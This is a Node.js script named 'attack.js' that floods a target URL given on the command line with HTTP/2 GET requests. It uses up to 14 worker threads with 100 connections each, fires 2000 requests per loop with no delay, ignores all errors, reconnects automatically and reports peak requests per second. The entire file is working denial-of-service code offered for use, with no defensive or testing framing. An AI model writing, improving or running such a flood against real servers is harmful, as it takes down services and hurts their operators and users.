const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { cpus } = require('os');

const THREADS = Math.min(14, cpus().length);

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.log(`Launching attack on ${target} for ${duration}s with ${THREADS} threads...`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration } });
    }
} else {
    const { target, duration } = workerData;
    const end = Date.now() + duration * 1000;
    let requestCount = 0;
    let peakRPS = 0;

    // Function to track and log peak RPS
    function logPeakRPS() {
        const rps = requestCount / (duration - (end - Date.now())) * 1000;
        if (rps > peakRPS) {
            peakRPS = rps;
            console.clear();
            console.log(`PEAK RPS: ${Math.round(peakRPS)}`);
        }
    }

    // Flooding logic to hit CPU hard
    function startFlood(client) {
        // Maximize the amount of requests sent in the shortest amount of time
        const interval = setInterval(() => {
            if (Date.now() > end) {
                clearInterval(interval);
                return;
            }

            try {
                // Sending 2000 requests per cycle (increase for more speed)
                for (let i = 0; i < 2000; i++) {
                    const req = client.request({ ':path': '/', ':method': 'GET' });
                    req.on('error', () => {}); // Ignore errors
                    req.end();
                    requestCount++; // Increment request counter for RPS calculation
                }
            } catch (err) {
                // Ignore errors but continue pushing requests
            }

            // Log peak RPS every second (not too often to reduce overhead)
            logPeakRPS();
        }, 0); // No delay, flood as fast as possible
    }

    function createConnection() {
        let client;
        try {
            client = http2.connect(target);
        } catch (err) {
            return setTimeout(createConnection, 250); // Retry connection if failed
        }

        client.on('error', () => {}); // Ignore connection errors
        client.on('close', () => setTimeout(createConnection, 100)); // Reconnect on close
        client.on('connect', () => startFlood(client)); // Start flooding once connected
    }

    // Increase the number of connections per worker to maximize throughput
    for (let i = 0; i < 100; i++) { // Increase to 100 connections per worker
        createConnection();
    }
}
